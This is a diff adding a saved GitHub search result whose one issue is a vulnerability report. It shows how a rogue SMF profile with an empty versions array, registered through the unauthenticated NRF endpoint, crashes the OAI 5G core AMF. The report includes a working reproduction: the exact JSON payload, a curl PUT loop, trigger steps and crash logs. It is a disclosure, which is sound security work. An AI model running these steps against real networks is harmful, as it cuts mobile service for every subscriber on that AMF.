@@ -1,0 +1,83 @@
+{
+ "query": "repo:openairinterface/oai-cn5g-amf is:issue crash reconnect OR crash re-register",
+ "date": "2026-11-05",
+ "total_count": 1,
+ "items": [
+  {
+   "url": "https://api.github.com/repos/openairinterface/oai-cn5g-amf/issues/40",
+   "repository_url": "https://api.github.com/repos/openairinterface/oai-cn5g-amf",
+   "labels_url": "https://api.github.com/repos/openairinterface/oai-cn5g-amf/issues/40/labels{/name}",
+   "comments_url": "https://api.github.com/repos/openairinterface/oai-cn5g-amf/issues/40/comments",
+   "events_url": "https://api.github.com/repos/openairinterface/oai-cn5g-amf/issues/40/events",
+   "html_url": "https://github.com/openairinterface/oai-cn5g-amf/issues/40",
+   "id": 5881343230,
+   "node_id": "I_kwDOTP-du88AAAABXo4s_g",
+   "number": 40,
+   "title": "A rogue NRF profile with an empty `nfServices[0].versions` array aborts the AMF on the first UE PDU session",
+   "user": {
+    "login": "hackeryounow",
+    "id": 113762680,
+    "node_id": "U_kgDOBsfheA",
+    "avatar_url": "https://avatars.githubusercontent.com/u/113762680?v=4",
+    "gravatar_id": "",
+    "url": "https://api.github.com/users/hackeryounow",
+    "html_url": "https://github.com/hackeryounow",
+    "followers_url": "https://api.github.com/users/hackeryounow/followers",
+    "following_url": "https://api.github.com/users/hackeryounow/following{/other_user}",
+    "gists_url": "https://api.github.com/users/hackeryounow/gists{/gist_id}",
+    "starred_url": "https://api.github.com/users/hackeryounow/starred{/owner}{/repo}",
+    "subscriptions_url": "https://api.github.com/users/hackeryounow/subscriptions",
+    "organizations_url": "https://api.github.com/users/hackeryounow/orgs",
+    "repos_url": "https://api.github.com/users/hackeryounow/repos",
+    "events_url": "https://api.github.com/users/hackeryounow/events{/privacy}",
+    "received_events_url": "https://api.github.com/users/hackeryounow/received_events",
+    "type": "User",
+    "user_view_type": "public",
+    "site_admin": false
+   },
+   "labels": [],
+   "state": "closed",
+   "locked": false,
+   "assignees": [],
+   "milestone": null,
+   "comments": 0,
+   "created_at": "2026-10-16T09:00:15Z",
+   "updated_at": "2026-11-02T13:03:14Z",
+   "closed_at": "2026-11-02T13:03:14Z",
+   "assignee": null,
+   "author_association": "CONTRIBUTOR",
+   "issue_field_values": [],
+   "type": null,
+   "active_lock_reason": null,
+   "sub_issues_summary": {
+    "total": 0,
+    "completed": 0,
+    "percent_completed": 0
+   },
+   "issue_dependencies_summary": {
+    "blocked_by": 0,
+    "total_blocked_by": 0,
+    "blocking": 0,
+    "total_blocking": 0
+   },
+   "body": "## Summary\n\nCommit ID: `3bb4508bf4891048865a5856ddd97537fe0c24d5`\n\nThe OAI AMF selects an SMF by parsing the `Nnrf_NFDiscovery` reply, and reads the first element of each candidate's `nfServices[0].versions` with `nlohmann::json::at(0)` after checking only that the `versions` key **exists** \u2014 never that the array is **non-empty**. `at(0)` on an empty array throws `json.exception.out_of_range.401`, and nothing on the call path catches it: ITTI starts the task on a bare `std::thread`, no terminate handler is installed, and the AMF handles SIGTERM/SIGINT only. `std::terminate()` runs and the AMF process dies.\n\nAn attacker supplies that empty array himself. The NRF's `Nnrf_NFManagement` registration endpoint is unauthenticated, so one `PUT /nnrf-nfm/v1/nf-instances/{nfInstanceID}` stores a rogue SMF profile with `\"versions\": []` \u2014 the NRF's generated model validator, which requires at least one version, is never invoked on the registration path. Two further defects make the outcome deterministic rather than probabilistic: the AMF parses a discovery candidate **even when its S-NSSAI does not match** (the `continue` that would skip it is commented out at `amf_sbi.cpp:1845`, and the `break` sits *after* the parse block), and the NRF serves discovery results in `nfInstanceID` key order from a `std::map`, so registering the lexicographic-minimum UUID `00000000-0000-4000-8000-000000000000` puts the rogue at `nfInstances[0]`.\n\nThe next ordinary UE PDU-session request makes the AMF discover SMFs, read the poisoned first entry, and abort (exit 139); with `RestartPolicy=no` the container stays dead and every UE attached to the AMF loses NAS service. Re-arming after a restart costs one more 961-byte HTTP PUT.\n\n## Step to Reproduce\n\nTested target: OAI CN5G \"basic, with NRF\" scenario (9 containers: mysql, nrf, udr, udm, ausf, amf, smf, upf, ext-dn) with UERANSIM as gNB+UE; image digests under Affected Versions. The attack runs from the Docker host and needs only `curl` built with nghttp2.\n\n1. **Deploy the core and the UE** (stop any stack that is already running first):\n\n   ```bash\n   git clone https://github.com/hackeryounow/5gc-deployments.git\n   cd 5gc-deployments/oai/develop\n   docker compose down                                              # remove any previous stack\n   docker compose -p develop -f docker-compose-basic-nrf.yaml up -d\n   # wait ~2 min until all 9 containers report (healthy); mysql starts first\n   cd ../../ueransim/oai\n   docker compose -p 221 -f docker-compose-ueransim-vpp.yaml up -d\n   sleep 30 && docker exec ueransim sh -c 'ip -br addr | grep uesimtun'\n   # -> uesimtun0 10.1.1.130/32      (UE registered, PDU session up)\n   ```\n\n2. **Poison the NRF** with the rogue SMF profile \u2014 no `Authorization` header of any kind (keep re-PUTing in the background: the profile's `heartBeatTimer` is 10 s):\n\n   ```bash\n   echo '{\"nfInstanceId\":\"00000000-0000-4000-8000-000000000000\",\"nfInstanceName\":\"ROGUE-SMF-C1-2\",\"nfType\":\"SMF\",\"nfStatus\":\"REGISTERED\",\"fqdn\":\"rogue-smf\",\"ipv4Addresses\":[\"172.20.0.99\"],\"nfServices\":[{\"serviceName\":\"nsmf-pdusession\",\"serviceInstanceId\":\"00000000-0000-4000-8000-000000000000-nsmf-pdusession\",\"nfServiceStatus\":\"REGISTERED\",\"scheme\":\"http\",\"ipEndPoints\":[{\"ipv4Address\":\"172.20.0.99\",\"port\":8080,\"transport\":\"TCP\"}],\"versions\":[]}],\"sNssais\":[{\"sst\":1,\"sd\":\"ffffff\"}],\"smfInfo\":{\"sNssaiSmfInfoList\":[{\"sNssai\":{\"sst\":1,\"sd\":\"ffffff\"},\"dnnSmfInfoList\":[{\"dnn\":\"oai\"}]}]},\"heartBeatTimer\":10,\"priority\":1,\"capacity\":100}' > attack_profile.json\n   while true; do\n     curl -s --http2-prior-knowledge -X PUT \\\n       \"http://172.20.0.3:8080/nnrf-nfm/v1/nf-instances/00000000-0000-4000-8000-000000000000\" \\\n       -H \"Content-Type: application/json\" --data-binary @attack_profile.json\n     sleep 4\n   done &\n   # -> HTTP/2 201 Created\n   ```\n\n3. **Confirm the NRF serves the rogue first** (the AMF parses instances in reply order):\n\n   ```bash\n   curl -s --http2-prior-knowledge \\\n     \"http://172.20.0.3:8080/nnrf-disc/v1/nf-instances?target-nf-type=SMF&requester-nf-type=AMF\" \\\n     | python3 -m json.tool | grep -A6 '\"nfInstances\"'\n   # -> [0] 00000000-0000-4000-8000-000000000000  sNssais=[{sst 1, sd ffffff}]  versions=[]\n   #    [1] <legitimate SMF>                      versions=[{apiVersionInUri v1, ...}]\n   ```\n\n4. **Trigger** \u2014 recreate the UE so it registers and requests a PDU session (a plain `docker restart` of the UE container exits 1; recreate it):\n\n   ```bash\n   docker compose -p 221 -f docker-compose-ueransim-vpp.yaml up -d --force-recreate\n   sleep 5 && docker inspect oai-amf --format '{{.State.Status}} exit={{.State.ExitCode}}'\n   # -> exited exit=139\n   ```\n\n## Logs\n\nThe AMF, in its last seconds \u2014 discovery of the poisoned reply, the non-match that is parsed anyway, and the unhandled exception (`docker logs oai-amf`):\n\n```\n[2026-10-16 08:10:14.657] [amf_sbi] [debug] Send NFDiscovery to NRF to discover the available SMFs\n[2026-10-16 08:10:14.661] [amf_sbi] [info] Get response with HTTP code (200)\n[2026-10-16 08:10:14.662] [amf_sbi] [debug] S-NSSAI is not matched for SMF profile\nterminate called after throwing an instance of 'nlohmann::json_abi_v3_12_0::detail::out_of_range'\n  what():  [json.exception.out_of_range.401] array index 0 is out of range\n```\n\nThe container (`docker inspect oai-amf`; the AMF had started at 2026-10-16T06:02:00Z, pid 2462226, so the crash is on a fresh process less than 9 minutes old):\n\n```\nstatus=exited exit=139 oom=false restarts=0 started=2026-10-16T06:02:00.083422472Z finished=2026-10-16T06:10:14.952673411Z\n```\n\n## Affected Versions\n\n- Tested live: `oaisoftwarealliance/oai-nrf:develop` digest `sha256:619b44434481217096d13f40d8ff79ce8c6c456e35faf87247664d981eec6513`\n\n## Impact\nAny host that reaches the NRF can, with one unauthenticated request, arm the defect so that the next ordinary subscriber PDU-session request kills the AMF (exit 139) \u2014 a remotely re-armable denial of all NAS service for every UE on that AMF, which stays down until an operator intervenes.\n\n## CVSS v4\n`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N` \u2014 **8.7 (High)**\n\n",
+   "reactions": {
+    "url": "https://api.github.com/repos/openairinterface/oai-cn5g-amf/issues/40/reactions",
+    "total_count": 0,
+    "+1": 0,
+    "-1": 0,
+    "laugh": 0,
+    "hooray": 0,
+    "confused": 0,
+    "heart": 0,
+    "rocket": 0,
+    "eyes": 0
+   },
+   "timeline_url": "https://api.github.com/repos/openairinterface/oai-cn5g-amf/issues/40/timeline",
+   "performed_via_github_app": null,
+   "state_reason": "completed",
+   "pinned_comment": null,
+   "score": 1.0
+  }
+ ]
+}
